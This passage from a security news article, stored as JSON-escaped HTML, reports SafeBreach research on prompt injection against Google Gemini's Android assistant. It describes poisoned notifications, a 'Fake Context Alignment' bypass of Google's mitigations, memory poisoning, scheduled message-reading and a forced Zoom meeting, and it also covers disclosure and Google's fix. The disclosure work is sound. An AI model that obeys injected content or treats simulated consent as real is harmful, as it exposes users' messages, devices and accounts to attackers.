apps:\u003c/strong\u003e In the demo, Yair used a safe-looking domain that later redirected to a Zoom app link, causing Gemini to follow it without prompting and force the phone into a meeting that streamed video.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMemory poisoning:\u003c/strong\u003e Fake Context Alignment simulated consent so Gemini saved an attacker-chosen fact persistently, such as storing the victim’s name as “Danny.”\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ePersistence:\u003c/strong\u003e The technique could create scheduled actions, such as a recurring task to read the victim’s recent messages every day at 8 PM.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThe Zoom demonstration was described with specific limits. The article says SafeBreach stressed that its own domain never redirected to Zoom, and that the redirect ran on a local server on the test device.\u003c/p\u003e\n\n\u003ch2 id=\"memory-poisoning-significance\"\u003eMemory Poisoning Significance\u003c/h2\u003e\n\n\u003cp\u003eThe article highlights memory poisoning as an impact the earlier calendar-based technique had not achieved. Because Fake Context Alignment could simulate consent, Gemini stored an attacker-chosen fact as persistent memory. The article notes that this memory is account-level, so the poisoned fact is not limited to the phone and follows the victim wherever they use Gemini on that account.\u003c/p\u003e\n\n\u003ch2 id=\"affected-parties-and-products\"\u003eAffected Parties and Products\u003c/h2\u003e\n\n\u003cp\u003eThe affected product was Google Gemini’s voice assistant on Android, specifically in connection with the Utilities feature that reads and replies to notifications. The notification sources mentioned in the article include WhatsApp, Slack, SMS, Signal, Instagram, and Messenger. Google Home-connected devices, Zoom, and account-level Gemini memory were also involved in the demonstrated impact paths.\u003c/p\u003e\n\n\u003cp\u003eThe research was conducted by SafeBreach’s Or Yair and reported through Google’s Vulnerability Reward Program.\u003c/p\u003e\n\n\u003ch2 id=\"disclosure-and-mitigation\"\u003eDisclosure and Mitigation\u003c/h2\u003e\n\n\u003cp\u003eSafeBreach reported the findings to Google’s Vulnerability Reward Program on August 17, 2025. Google treated the issue as high priority. On November 14, 2025, Google confirmed that content-classifier improvements mitigated the notification injections and the Delayed Tool Invocation bypass.\u003c/p\u003e\n\n\u003cp\u003eThe fix was server-side, so users do not need to install an app update to receive the mitigation. The article says the main user-controlled options are to disconnect the Utilities app in Gemini’s Connected Apps settings or turn off the Google app’s “Notification read, reply \u0026amp; control” permission on Android.\u003c/p\u003e\n","keyPoints":["SafeBreach researcher Or Yair found that a poisoned notification from apps such as WhatsApp, Slack, SMS, Signal, Instagram, or Messenger could have hijacked Google Gemini’s voice assistant on Android.","The issue affected Gemini’s Android Utilities feature, which can read and reply to notifications, and did not require a malicious app to be installed on the phone.","Yair bypassed Google’s earlier prompt-injection mitigations using a technique called Fake Context Alignment, which made a user’s harmless-sounding confirmation appear to authorize a sensitive action.","The demonstrated impacts included faking messages from contacts, controlling smart home devices through Google Home, openin
